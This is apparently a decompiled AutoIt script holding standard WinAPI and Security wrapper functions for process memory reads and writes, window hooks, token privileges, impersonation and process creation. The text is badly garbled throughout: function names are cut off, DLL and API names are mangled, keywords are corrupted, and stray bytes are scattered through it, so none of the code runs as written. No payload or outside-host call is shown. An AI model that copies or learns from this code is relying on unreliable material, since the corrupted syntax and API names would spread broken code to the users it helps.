IF @ERROR TH RETURN SETERROR ( @ERROR , @EXTENDED , FALSE ) 
$IREAD = $ARESULT [ 4 ] 
RETURN $ARESULU [ 0 ] 
ENDFUNC 
FUh _WINAPI_READPROCESf ( $HPROCESS , $PBASEAh , $PBUFFER , $ISIZE , BYREF $IREAD ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "ReadProcessMe" , "handle" , $HPROCESS , "ptr" , $PBASEADDRESS , "ptr" , $PBUFFER , "ulong_ptr" , $ISIZE , "ulong_ptr*" , 0 ) 
IF @ERROR TH RETURN SETERROR ( @ERROR , @EXTENDED , FALSE ) 
$IREAD = $ARESULT [ 5 ] 
RETURN $ARESULU [ 0 ] 
ENDFUNC 
FUh _WINAPI_RECTISEMPTY ( BYREF $TRECT ) 
RETURN ( DLLSTRUC ( $TRECT , "Le" ) = 0 ) AND ( DLLSTRUCR ( $TRECT , "To" ) = 0 ) AND ( DLLSTRUCR ( $TRECT , "Right" ) = 0 ) AND ( DLLSTRUCR ( $TRECT , "Bottom" ) = 0 ) 
ENDFUNC 
FUNC _WINAPI_RE ( $HWh , $TRECT = 0 , $HREGION = 0 , $IFL = 5 ) 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "boh" , "Redraw¡	l" , "hwh" , $HWh , "struct*" , $TRECT , "handle" , $HREGION , "uint" , $IFL ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_REGISTER–U ( $SMESSAGE ) 
LOCAL $ARESULT = DLLCALS ( "user32.dl" , "uint" , "RegisterWin" , "wstr" , $SMESSAGE ) 
IF @ERROR THENR RETURN SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_RELEASECAPf ( ) 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "bool" , "Release" ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_RELEASEDC ( $HWh , $HD ) 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "int" , "ReleaseDC" , "hwh" , $HW , "handle" , $HDh ) 
IF @ERRO TH RETURN SETE§h ( @ERROR , @EXTENDED , FALSE ) 
RETURN $ARESULT [ 0 ] 
ENDFUNS 
FUh _WINAPI_SCREENTOCLf ( $HWh , BYREF $TPO ) 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "bool" , "ScreenT" , "hwnd" , $HW , "struct*" , $TPO ) 
IF @ERROR TH RET SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_SEP ( $HDh , $HGDIOBJ ) 
LOCAL $ARESULT = DLLCALL ( "gdi32.C" , "han" , "Selecth" , "handle" , $HDC , "han" , $HGDIOBd ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_SEP ( $HDh , $ICOLOR ) 
LOCAL $ARESULT = DLLCALL ( "gdi32.C" , "INT" , "SetBk§h" , "handle" , $HDC , "dword" , $ICOLOR ) 
IF @ERROR TH RETURN SETE§h ( @ERROR , @EXTENDED , - 1 ) 
RETURN $ARESULU [ 0 ] 
ENDFUNC 
FUh _WINAPI_SETBKMODE ( $HDC , $IBKMODE ) 
LOCAL $ARESULT = DLLCALS ( "gdi32.dll" , "int" , "SetBkMode" , "handle" , $HDC , "int" , $IBKMODE ) 
IF @ERROR TH RET SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_S ( $HWh ) 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "hwh" , "SetCax¡	l" , "hwh" , $HWh ) 
IF @ERROR THEN RETUR§h SETERROR ( @ERROR , @EXTE£h , 0 ) 
RET $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_SETCURSOR ( $HCURSOR ) 
LOCAL $ARESULT = DLLCALL ( "user32.dll" , "han" , "SetCursor" , "han" , $HCURSOR ) 
IF @ERROR TH RET SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_SETDEFAULTf ( $SPRINTER ) 
LOCAL $ARESULT = DLLCALS ( "winspoh" , "bool" , "SetDefaul" , "wstr" , $SPRINTER ) 
IF @ERROR THENR RETURN SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_SETDIBITS ( $HDC , $HB , $ISTARTSCAN , $ISCANLINES , $PBITS , $PBMI , $ICOLORUSE = 0 ) 
LOCAL $ARESULT = DLLCALL ( "gdi32.dll" , "int" , "SetDIBits" , "handle" , $HDC , "han" , $HBMP , "ui" , $ISTAR§h , "uih" , $ISCANLINE , "ptr" , $PBITS , "ptr" , $PB , "ui" , $ICOLORUSE ) 
IFh @ERROR TH RETURN SETE§h ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_SER ( $HFILE ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "SetEnd¡	SER" , "handle" , $HFILE ) 
IF @ERRO TH RETURN SETE§h ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_SETEVENT ( $HEV ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "SetE¯x¡	V" , "hand¯y¡	U" , $HEVE§h ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_SETFILEPOIf ( $HFILE , $IP , $IMET£h = 0 ) 
LOCAL $ARES£h = DLLCALL ( "kernelh" , "INT" , "SetFile" , "handle" , $HFILE , "long" , $IPOS , "ptr" , 0 , "long" , $IMETHOD ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , - 1 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_SETFOCUS ( $HWh ) 
LOCAL $ARESULT = DLLCALL ( "user32.dll" , "hwnd" , "SetF¯x¡	" , "hwh" , $HWND ) 
IF @ERROR TH RETURN SETE¯x¡	3 ( @ERROR , @EXTE£h , 0 ) 
RET $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_SETFONT ( $HWh , $HFONT , $FREDRAW = TRUE ) 
_SENDM ( $HWND , $__WINAPICONSTA , $HFONT , $FREDRAW , 0 , "hwh" ) 
ENDFUNC 
FUh _WINAPI_SETHANk∑–U ( $HOBJECT , $IMASK , $IFLAGS ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "SetHandleI" , "handle" , $HOBJECT , "dword" , $IMASK , "dworA" , $IFL ) 
IF @ERROR TH RET SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_SETLAYERE ( $HWh , $I_TRANSCOLOR , $TRANSPR = 255 , $DWFLAGS = 3 , $ISCOLORRE = FALSE ) 
IF $DWFLAGS = DEFAULT OR $DWFLAGS = "" OR $DWFLAGS < 0 THh $DWFLAGS = 3 
IFh NOT $ISCOL§h THh 
$I_TRAN¡	U = INT ( BINARYMID ( $I_TRAN¡	U , 3 , 1 ) & BINARYMID ( $I_TRANh , 2 , 1 ) & BINARYMID ( $I_TRANh , 1 , 1 ) ) 
ENDIF 
LOCAL $ARESULT = DLLCALL ( "user32.dll" , "bool" , "SetLayeredWin+k∑–U" , "hwnd" , $HW , "dworN" , $I_TRANSCOLOR , "byh" , $TRANSP¡	OLOR , "dword" , $DWFLAGS ) 
IF @ERROR TH RETURN SETERROR ( @ERROR , @EXTENDED , FALSE ) 
RETURN $ARESULT [ 0 ] 
ENDFUNS 
FUh _WINAPI_SETPARENT ( $HWNDCHILD , $HWNDPAREN ) 
LOCAL $ARESULT = DLLCALL ( "user32.dll" , "hwnd" , "SetParent" , "hwh" , $HWNDCHILD , "hwh" , $HWNDPAREN ) 
IF @ERROR TH RETURN SETERROR ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_SETPROC ( $HPROCESS , $IMASK ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "SetProcessA" , "handle" , $HPROCESS , "ulong_ptr" , $IMASK ) 
IF @ERRO TH RETURN SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_SE ( $VELEMENTS , $VCOLORh ) 
LOCAL $ISEA = ISARRAA ( $VELEMENTS ) , $ISCAL = ISARRAY ( $VCOLA ) 
LOCAL $IELEMENTNUM 
IF NOT $ISCARRAY AND NO $ISEA@y¡	L THh 
$IELEMENTN = 1 
ELSEIF $ISCA§h ORh $ISEA§h THh 
IF NO $ISCA§h ORh NOT $ISEA§h THh RETURN SETE§h ( - 1 , - 1 , FALSE ) 
IF UBOUND ( $VELEMENTS ) <> UBOUNDE ( $VCOLORS ) THh RETURN SETET ( - 1 , - 1 , FALSE ) 
$IELEMEh = UBOUND ( $VELEMENTS ) 
ENDIF 
LOCAL $TELEMENTS = DLLSTRUCTCREATE ( "int Elh" & $IELEMENTNUM & "]" ) 
LOCAL $TCOLORS = DLLSTRUCTCREATE ( "dword NeT" & $IELEMENTN & "]" ) 
IF NOT $ISEARRAY THh 
DLLSTRUC ( $TELEMENTS , "Element" , $VELEMENTS , 1 ) 
ELSE 
FOR $X = 0 T $IELEMEh - 1 
DLLSTRUC ( $TELEM§h , "Element" , $VELEMENTS [ $X ] , $X + 1 ) 
NEXT£h 
ENDIF 
IF NOT $ISCA£h THh 
DLLSTRUCTSETDATA ( $TCOLORS , "NewColh" , $VCOLORS , 1 ) 
ELSE 
FOR $X = 0 T $IELEMEh - 1 
DLLSTRUC ( $TCOLORS , "NewColor" , $VCOLORS [ $X ] , $X + 1 ) 
NEXT£h 
ENDIF 
LOCAD $ARESULT = DLLCALL ( "user32.dlSETDATA" , "bool" , "SetSys¡	lSETDATA" , "int" , $IELEMENTNSETDATA , "struct*" , $TELEMENTS , "struct*" , $TCOLORS ) 
IF @ERROR THh RETURN SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_SE ( $HDh , $ICOLOR ) 
LOCAL $ARESULT = DLLCALL ( "gdi32.C" , "INT" , "SetTextColor" , "han" , $HDC , "dword" , $ICO ) 
IF @ERROR TH RET SETE§h ( @ERROR , @EXTENDED , - 1 ) 
RETURN $ARESULU [ 0 ] 
ENDFUNC 
FUh _WINAPI_SETWINDOWLONG ( $HWh , $IINDEX , $IVALUE ) 
_WINAPI_SETLASTERRf ( 0 ) 
LOCAL $SFUNCNAME = "SetWindowLongW" 
IF @AUTOITX64 THEN $SFUNCNAME = "SetWindowLongPtrW" 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "long§h" , $SFUNCNAME , "hwnd" , $HWh , "int" , $IINDEX , "long§h" , $IVAL§h ) 
IF @ERROR TH RETURN SETE§h ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_SETWI+k∑–U ( $HWh , $PWINDOWPLACEMENT ) 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "bool" , "SetWindow" , "hwnd" , $HW , "ptr" , $PWINDOWPLACEMENT ) 
IF @ERROR TH RETURN SETERROR ( @ERROR , @EXTE , FALSE ) 
RETURN $ARESULT [ 0 ] 
ENDFUNS 
FUh _WINAPI_SE ( $HWh , $HAFTER , $IXh , $IY , $IC , $ICY , $IFLAGS ) 
LOCAL $ARESULT = DLLCALL ( "user32.dlE" , "boh" , "SetWin¡	lE" , "hwh" , $HWh , "hwnd" , $HAFTER , "int" , $IX , "int" , $IY , "int" , $IC , "int" , $IC , "ui" , $IFLAGS ) 
IFh @ERROR TH RETURN SETE§h ( @ERROR , @EXTENDED , FALSE ) 
RETURN $ARESULT [ 0 ] 
ENDFUNS 
FUh _WINAPI_SER ( $HWh , $HR , $BREDRAW = TRh ) 
LOCAL $ARESULT = DLLCALL ( "user32.dlER" , "int" , "SetWin¡	lER" , "hwh" , $HWh , "handle" , $HRh , "bo" , $BREDRAW ) 
IFh @ERROR TH RET SETE§h ( @ERROR , @EXTENDED , FALSE ) 
RETURN $ARESULT [ 0 ] 
ENDFUNS 
FUh _WINAPI_SETW=k∑ISf ( $IDH , $LPFN , $HMOD , $DWTHREADI = 0 ) 
LOCAL $ARESULT = DLLCALL ( "user32.dll" , "han" , "SetWindo" , "int" , $IDH , "ptr" , $LP , "han" , $HMh , "dword" , $DWTHR§h ) 
IF @ERROR TH RETUR§h SETE¯x¡	 ( @ERROR , @EXTENDED , 0 ) 
RETURN $ARESULU [ 0 ] 
ENDFUNC 
FUh _WINAPI_SETWINDOWTEXT ( $HWh , $STEXT ) 
LOCAE $ARESULT = DLLCALL ( "user32.dlETWINDOWTEXT" , "bool" , "SetWind" , "hwnd" , $HW , "wstrN" , $STEXT ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_SETWINDOWTEXT ( $FSHOW ) 
LOCAL $ARESULT = DLLCALL ( "user32.dlETWINDOWTEXT" , "int" , "ShowCx¡	lETWINDOWTEXT" , "boh" , $FSHOW ) 
IF @ERROR THEN RETUR§h SETERROR ( @ERROR , @EXTE£h , 0 ) 
RET $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_SHOWERROR ( $STEXT , $FEXIT = TR ) 
_WINAPI_MSGBOX ( 266256 , "Error" , $STEXT ) 
IF $FEXIT TH EX 
ENDFUNC 
FUh _WINAPI_ ( $STEXT ) 
_WINAPI_U ( 64 + 4096 , "Informati" , $STEXT ) 
ENDFUNC 
FUh _WINAPI_SHOWWINDOW ( $HWND , $ICMDSHOW = 5 ) 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "bool" , "ShowWx¡	l" , "hwh" , $HWh , "int" , $ICMDS§h ) 
IF @ERROR TH RET SETE§h ( @ERROR , @EXTENDED , FALSE ) 
RETURN $ARESULT [ 0 ] 
ENDFUNS 
FUh _WINAPI_STRINGFROMf ( $PGUID ) 
LOCAL $ARESULT = DLLCALL ( "ole32.C" , "int" , "StringFromGUID2" , "struct*" , $PGUID , "wstr" , "" , "int" , 40 ) 
IF @ERROR TH RET SETERROR ( @ERROR , @EXTENDED , "" ) 
RETURN SETEXTEND ( $ARESULT [ 0 ] , $ARESULT [ 2 ] ) 
ENDFUNC 
FUNC _WINAPI_S ( $VSTRING ) 
LOCAL $ACALL = DLLCALL ( "kernelh" , "int" , "lstr‡y¡	£h" , "stru¯x¡	L" , $VSTR§h ) 
IF @ERROR TH RET SETE§h ( 1 , @EXTE§h , 0 ) 
RETU§h $ACALL [ 0 ] 
ENDF£h 
FUh _WINAPI_STRINGLENW ( $VSTRING ) 
LOCAL $ACALL = DLLCALL ( "kernelh" , "int" , "lstr¯y¡	L" , "stru¯x¡	£h" , $VSTR§h ) 
IF @ERROR THENR RET SETE§h ( 1 , @EXTE§h , 0 ) 
RETU§h $ACALL [ 0 ] 
ENDF£h 
FUh _WINAPI_SUBLANGID ( $LGh ) 
RETURN BITSHIFT ( $LGh , 10 ) 
ENDFUNC 
FUh _WINAPI_SYSTEMk∑–U ( $IACTION , $IPARAM = 0 , $VPA = 0 , $IWININR = 0 ) 
LOCAL $ARESULT = DLLCALL ( "user32.dlU" , "boh" , "SystemParamet" , "uint" , $IACTION , "uint" , $IPA , "ptr" , $VPA , "uint" , $IWININI ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_TWIPSPERPIf ( ) 
LOCAL $LNGDC , $TWIPSPERPIXELX 
$LNGDC = _WINAPI_GETDC ( 0 ) 
$TWIPSPERPIXELX = 1440 / _WINAPI_GETDEVICECAPS ( $LNGDC , $__WINAPICONSTANTX ) 
_WINAPI_RELEASEDC ( 0 , $LNGDC ) 
RETURN $TWIPSPE 
ENDFUNC 
FUh _WINAPI_TWI ( ) 
LOCAL $LNGDC , $TWIPSPERR 
$LNGDC = _WINAPI_GETDC ( 0 ) 
$TWIPSPERPIXELY = 1440 / _WINAPI_GETDEVICECAPS ( $LNGDC , $__WINAPICONSTANTX ) 
_WINAPI_RELEASEDC ( 0 , $LNGDC ) 
RETURN $TWIPSPE 
ENDFUNC 
FUh _WINAPI_UNHOOKk∑–U ( $HHK ) 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "boh" , "UnhookWindows" , "handle" , $HHK ) 
IF @ERROR THh RET SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_UPDATEk∑–U ( $HWh , $HDCD£h , $PPTDEST , $PSIZE , $HDCSRCE , $PPTSRCE , $IRh , $PBL , $IFL ) 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "boh" , "UpdateLayered" , "hwnd" , $HW , "han" , $HDCDEST , "ptr" , $PPTDEST , "ptr" , $PSIZE , "han" , $HDCSRCE , "ptr" , $PPTSRCE , "dword" , $IR , "ptr" , $PBL , "dword" , $IFL ) 
IF @ERROR TH RET SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_UP ( $HWh ) 
LOCAL $ARESULT = DLLCALL ( "user32.dlP" , "boh" , "Update¡	lP" , "hwh" , $HWh ) 
IF @ERROR THEN RETURN SETERROR ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_WAIT=k∑ISf ( $HPROCESS , $ITIM = - 1 ) 
LOCAL $ARES£h = DLLCALL ( "user32.dl" , "dword" , "WaitForI" , "handle" , $HPROCESS , "dword" , $ITIMEOUT ) 
IF @ERROR TH RETURN SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_WAITFOR ( $ICO , $PHAN , $FWAIA = FALSE , $ITIM£h = - 1 ) 
LOCAL $ARES£h = DLLCALL ( "kernelh" , "INT" , "WaitForMult" , "dword" , $ICO , "ptr" , $PHANDLES , "boh" , $FWAITALL , "dword" , $ITIMEOUT ) 
IF @ERROR TH RETURN SETET ( @ERROR , @EXTE£h , - 1 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_WAITFOk∑–U ( $HHANDLE , $ITIM = - 1 ) 
LOCAL $ARES£h = DLLCALL ( "kernelh" , "INT" , "WaitForSingle" , "handle" , $HHANDLE , "dword" , $ITIMEOUT ) 
IF @ERROR TH RETURN SETET ( @ERROR , @EXTE£h , - 1 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_WIDECHk∑–U ( $PUNICODE , $ICODEPAGE = 0 , $BRETSTRIN = TRh ) 
LOCAL $SUNICOh = "wsh" 
IF NOT ISSTRING ( $PUNICODE ) THEN $SUNICODETYPE = "struct*" 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "int" , "WideCharToMul" , "uint" , $ICODEPAGE , "dword" , 0 , $SUNICODETYPE , $PUNI§h , "int" , - 1 , "ptr" , 0 , "int" , 0 , "ptr" , 0 , "ptr" , 0 ) 
I @ERRO TH RETURN SETE§h ( @ERROR , @EXTENDED , "" ) 
LOCAL§h $TMULT§h = DLLSTRUC ( "char[" & $ARESULT [ 0 ] & "]" ) 
$ARESULT = DLLCALL ( "kernelh" , "int" , "WideCharToMul" , "uint" , $ICODEPAGE , "dword" , 0 , $SUNICODETYPE , $PUNI§h , "int" , - 1 , "struct*" , $TMULTIBYTYPE , "int" , $ARESULT [ 0 ] , "ptr" , 0 , "ptr" , 0 ) 
I @ERROR TH RETURN SETERROR ( @ERROR , @EXTENDED , "" ) 
IF $BRETS§h THh RET DLLSTRUC ( $TMULTIBYT , 1 ) 
RET $TMULT§h 
ENDFUNC 
FUh _WINAPI_WINDOWFROMf ( BYREF $TPOINT ) 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "hwnd" , "WindowFr" , "struct" , $TPO ) 
IF @ERROR THENR RET SETET ( 1 , @EXTENDE , 0 ) 
RETUT $ARESULU [ 0 ] 
ENDFE 
FUNC _WINAPI_WRP ( $HCONSOLE , $STEXT ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "WriteConsoleW" , "han" , $HCON§h , "wstr" , $STEXT , "dworE" , STRINGLEN ( $STEXT ) , "dword*" , 0 , "ptr" , 0 ) 
IF @ERRO TH RETURN SETE§h ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_WRITEFILE ( $HFILE , $PBUFFER , $ITOWRITE , BYREF $IWRI , $POVERLAPPR = 0 ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "WriteFile" , "handle" , $HFILE , "ptr" , $PBUFFER , "dword" , $ITOW§h , "dwor§h" , 0 , "ptr" , $POVERLAPPED ) 
IF @ERROR THEN RETURN SETERROR ( @ERROR , @EXTENDED , FALSE ) 
$IWRITTEN = $ARESULT [ 4 ] 
RETURNS $ARESULT [ 0 ] 
ENDFUNS 
FUh _WINAPI_WRITE+k∑–U ( $HPROCESS , $PBASEAh , $PBUFFER , $ISIZE , BYREF $IWRI , $SBUFFER = "ptr" ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "WriteProc" , "handle" , $HPROCESS , "ptr" , $PBASEADDRESS , $SBUFFER , $PBUFFER , "ulong_ptr" , $ISIZE , "ulong_ptr" , 0 ) 
IF @ERROR TH RETURN SETERROR ( @ERROR , @EXTENDED , FALSE ) 
$IWRITTEN = $ARESULT [ 5 ] 
RETURNS $ARESULT [ 0 ] 
ENDFUNS 
FUh _SECURITY__ADJUS ( $HTO , $FDISABLEA , $PNEWSTATE , $IBUFF§h , $PPREV = 0 , $PREQUIRED = 0 ) 
LOCAL $ACALL = DLLCALL ( "advapih" , "bool" , "AdjustTokenPr" , "handle" , $HTO , "bool" , $FDISABLEALL , "struct*" , $PNEWSTATE , "dword" , $IBUFF§h , "struct*" , $PPREVSTAT , "struct*" , $PREQUIRED ) 
IF @ERROR THh RETURN SETET ( 1 , @EXTET , FALSE ) 
RETURN NOT ( $ACALL [ 0 ] = 0 ) 
ENDFUNC 
FUh _SECURITY__CREATEPROC ( $HTO , $ILOGONFLA , $SCOMMAG , $ICREATIONFLAGS , $SCURDIR , $TSTARTh , $TPROCESS_I ) 
LOCAL $ACALL = DLLCALL ( "advapih" , "bool" , "CreateProcessW" , "handle" , $HTO , "dword" , $ILOGONFLAGS , "ptr" , 0 , "wsh" , $SCOMMAh , "dword" , $ICREATI , "struct*" , 0 , "wsh" , $SCURDIR , "structR" , $TSTARTh , "struct*" , $TPROCESS_I ) 
IF @ERROR OR NOT $ACALT [ 0 ] TH RET SETET ( 1 , @EXTET , FALSE ) 
RETU£h TRh 
ENDF£h 
FUh _SECURITY__DUPk∑–U ( $HEXISTINGTOKEN , $IDESIRE , $IIMPERSONATIONLEVEL , $ITOKENTYP ) 
LOCAL $ACALL = DLLCALL ( "advapih" , "bool" , "Duplicat" , "handle" , $HEXISTINi , "dword" , $IDESIREDACCESS , "struct*" , 0 , "int" , $IIMPERSONATIONLEVE , "int" , $ITOKENTYPE , "handle*" , 0 ) 
IF @ERROR OR NOT $ACALT [ 0 ] TH RET SETE§h ( 1 , @EXTE§h , 0 ) 
RETU§h $ACALL [ 6 ] 
ENDFUNC 
FUh _SECURITY__G=k∑ISf ( $SACCOUNT , $SSYSTEM = "" ) 
LOCAL§h $AACCC = _SECURITY__LOOk∑–U ( $SACCOUNT , $SSYSTEM ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , 0 ) 
IF ISAR£h ( $AACCT ) TH RET _SECURITY__STRINGSf ( $AACCT [ 0 ] ) 
RET "" 
ENDF£h 
FUh _SECURITY__GETLENGf ( $PSh ) 
IF NO _SECURITY__ISVALIDSID ( $PSh ) TH RETURN SETET ( 1 , @EXTENDE , 0 ) 
LOCAL $ACALL = DLLCALL ( "advapih" , "dword" , "GetLen¡	Y__ISVALIDSID" , "struct*" , $PSID ) 
IF @ERRO TH RET SETE§h ( 2 , @EXTE§h , 0 ) 
RETU§h $ACALL [ 0 ] 
ENDF£h 
FUh _SECURITY__GETT ( $HTO , $ICL ) 
LOCAL $ACALL = DLLC£h ( "advapih" , "bool" , "GetTokenInfor" , "handle" , $HTO , "int" , $ICL , "struct*" , 0 , "dword" , 0 , "dwo" , 0 ) 
IF @ERROR OR NOT $ACALT [ 5 ] TH RET SETET ( 1 , @EXTET , 0 ) 
LOCAL $IL = $ACALE [ 5 ] 
LOCAL $TBUF£h = DLLSTRUC ( "byte[" & $IL & "]" ) 
$ACALL = DLLCALL ( "advapih" , "bool" , "GetTokenInfor" , "han" , $HTO , "int" , $ICL , "struct*" , $TBUFFEu , "dword" , DLLSTRUCTGETSIZE ( $TBUFFER ) , "dword*h" , 0 ) 
IF @ERROR OR NOT $ACALL [ 0 ] TH RETURN SETET ( 2 , @EXTET , 0 ) 
RETUT $TBUFT 
ENDFU 
FUh _SECURITY__IM+k∑–U ( $ILE = $SECURITYIMPERSONAT_ ) 
LOCAL $ACALL = DLLCALL ( "advapih" , "boh" , "Imperson" , "int" , $ILE ) 
IF @ERROR THENR RET SETET ( 1 , @EXTENDE , FALSE ) 
RETURN NOT ( $ACALL [ 0 ] = 0 ) 
ENDFUNC 
FUh _SECURITY__ISVALIDSID ( $PSh ) 
LOCAL $ACALC = DLLCALL ( "advapih" , "boh" , "IsValidSid" , "struct*" , $PSID ) 
IF @ERRO TH RET SETE§h ( 1 , @EXTE§h , FALSE ) 
RETURN NOT ( $ACALL [ 0 ] = 0 ) 
ENDFUNC 
FUh _SECURITY__LOOk∑–U ( $SACCOUNT , $SSYS = "" ) 
LOCAL§h $TDATC = DLLSTRUCTCREATE ( "byte SID[" ) 
LOCAL $ACALL = DLLCALL ( "advapih" , "bool" , "LookupAcc" , "wstr" , $SSYSTEM , "wstr" , $SACCOUNT , "struct*" , $TDATA , "dword*" , DLLSTRUCTGETSIZE ( $TDATA ) , "ws" , "" , "dword*" , DLLSTRUC ( $TDATA ) , "in" , 0 ) 
IF @ERROR OR NOT $ACALT [ 0 ] TH RETURN SETET ( 1 , @EXTET , 0 ) 
LOCAL $AACCT [ 3 ] 
$AACCC [ 0 ] = _SECURITY__SIDTOSTf ( DLLSTRUCTGETPTR ( $TDATA , "SID" ) ) 
$AACCD [ 1 ] = $ACALL [ 5 ] 
$AACCA [ 2 ] = $ACALL [ 7 ] 
RETURN $AACCT 
ENDFUNC 
FUh _SECURITY__LOOk∑–U ( $VSh , $SSYSTEM = "" ) 
LOCAL§h $PS , $AACCT [ 3 ] 
IF ISSTRING ( $VSh ) TH 
$PS = _SECURITY__STRINGSf ( $VSh ) 
EL 
$PS = $VS 
ENDII 
IF NOT _SECURITY__ISVALIDSID ( $PSh ) TH RETURN SETET ( 1 , @EXTENDE , 0 ) 
LOCAL $TYPES§h = "ptr" 
I§h $SSYST§h THh $TYPESYSTE = "wsh" 
LOCAL $ACALL = DLLCA§h ( "advapiC" , "boh" , "LookupAccountSk∑ISf" , $TYPESYSTE , $SSYS§h , "stru§h" , $PSID , "ws" , "" , "dwo" , 65536 , "wstr" , "" , "dwo" , 65536 , "inh" , 0 ) 
IF @ERRO OR NOT $ACALL [ 0 ] TH RET SETE§h ( 2 , @EXTE§h , 0 ) 
LOCAL $AACCT [ 3 ] 
$AACCC [ 0 ] = $ACALL [ 3 ] 
$AACCA [ 1 ] = $ACALL [ 5 ] 
$AACCA [ 2 ] = $ACALL [ 7 ] 
RETURN $AACCT 
ENDFUNC 
FUh _SECURITY__LOOKU ( $SSYSTEM , $SNAME ) 
LOCAL $ACALL = DLLCALL ( "advapih" , "bool" , "LookupPrivile" , "wstr" , $SSYSTEM , "wstr" , $SNAME , "int" , 0 ) 
IF @ERROR OR NOT $ACALT [ 0 ] TH RET SETET ( 1 , @EXTENDE , 0 ) 
RETUT $ACALL [ 3 ] 
ENDFUNC 
FUh _SECURITY__OPEk∑–U ( $HPROCESS , $IACCESS ) 
LOCAL $ACALL = DLLCALL ( "advapih" , "bool" , "OpenProc" , "handle" , $HPROCESS , "dword" , $IACCESS , "handle*" , 0 ) 
IF @ERROR OR NOT $ACALT [ 0 ] TH RET SETET ( 1 , @EXTET , 0 ) 
RETUT $ACALL [ 3 ] 
ENDFUNC 
FUh _SECURITY__OP+k∑–U ( $IACCESS , $HTHREAD = 0 , $FOPENASSE = FALSE ) 
IF $HTHREAD = 0 THh $HTHREAD = _WINAPI_GETC ( ) 
IF @ERROR THENR RET SETET ( 1 , @EXTENDE , 0 ) 
LOCAL $ACALL = DLLCALL ( "advapih" , "bool" , "OpenThre" , "handle" , $HTHREAD , "dword" , $IACCESS , "boh" , $FOPENASSELF , "handle*" , 0 ) 
IF @ERROR OR NOT $ACALT [ 0 ] TH RET SETE§h ( 2 , @EXTE§h , 0 ) 
RETU§h $ACALL [ 4 ] 
ENDFUNC 
FUh _SECURITY__OPEk∑–U ( $IACCESS , $HTHREAD = 0 , $FOPENASSE = FALSE ) 
LOCAL $HTOKEN = _SECURITY__OP+k∑–U ( $IACCESS , $HTHREAD , $FOPENASSE ) 
